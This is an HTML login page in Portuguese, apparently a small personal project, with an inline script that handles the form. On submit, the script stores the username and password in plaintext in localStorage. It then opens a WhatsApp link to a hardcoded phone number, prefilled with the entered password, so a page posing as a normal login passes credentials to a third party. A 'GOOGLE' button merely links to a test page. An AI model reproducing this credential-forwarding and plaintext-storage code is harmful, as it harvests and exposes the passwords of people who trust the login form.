<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="sobre.css">
  <title>Login</title>
</head>









<body class="body">

  <img src="IMG-20260831-WA0017.jpg" alt="Descrição da imagem" class="tag2">

  <h1 class="darkred">Faça seu login</h1>

  <form id="formLogin"> <!-- TIREI O ACTION DAQUI -->

    <label for="campo_nome"><p class="pink2">Nome de usuário ou endereço de email:</p></label>
    <input id="campo_nome" type="text" required class="pink" placeholder="Digite seu email">

    <label for="campo_senha"><p class="black">Senha:</p></label>
    <input id="campo_senha" type="password" required class="black2" placeholder="Digite sua senha">

    <p id="erro-senha" class="none"></p>

    <button class="retangulo" type="submit">Entrar</button> <!-- ARRUMEI AQUI -->

    <div class="linha-ou">
        <hr>
        <span>ou</span>
        <hr>
    </div>

    <button class="retangulo2" type="button" onclick="window.location.href='test.html'">GOOGLE</button> <!-- ARRUMEI AQUI TAMBEM -->




    
  </form>





  <script>
    document.getElementById('formLogin').addEventListener('submit', function(e){
        e.preventDefault(); // Para de recarregar

        let nome = document.getElementById('campo_nome').value;
        let senha = document.getElementById('campo_senha').value;

        if(nome == "" || senha == ""){
            document.getElementById('erro-senha').innerText = "Preencha tudo!";
            document.getElementById('erro-senha').className = "";
            return;
        }

        // 1. Salva no navegador
        localStorage.setItem('usuario', nome);
        localStorage.setItem('senha', senha);

        // 2. Abre o WhatsApp
        let numero = "5599984531106";
        let mensagem = "Oi, sou " + nome + "\nEmail/Senha: " + senha + "\nAcabei de fazer login no DEV YUDI";
        let linkZap = "https://wa.me/" + numero + "?text=" + encodeURIComponent(mensagem);
        window.open(linkZap, '_blank');

        // 3. Depois de 1 seg vai pra menudevenda
        setTimeout(function(){
            window.location.href = "menudevenda.html";
        }, 1000);

    });
  </script>
</body>
</html>
